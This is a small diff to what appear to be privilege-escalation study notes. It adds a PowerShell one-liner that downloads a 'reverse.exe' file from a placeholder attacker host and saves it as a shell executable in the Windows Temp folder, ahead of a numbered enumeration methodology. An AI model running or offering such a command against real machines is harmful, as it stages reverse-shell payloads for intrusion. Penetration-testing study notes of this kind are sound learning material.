@@ -1,3 +1,6 @@
+example of how to download a file using PowerShell:
+powershell -c "Invoke-WebRequest -Uri 'http://<LHOST>:<LPORT>/reverse.exe' -OutFile 'C:\Windows\Temp\shell.exe'"
+
 0) Typically, privilege escalation will require you to follow a methodology similar to the one given below: 
 
   1) Enumerate the current user's privileges and resources it can access.
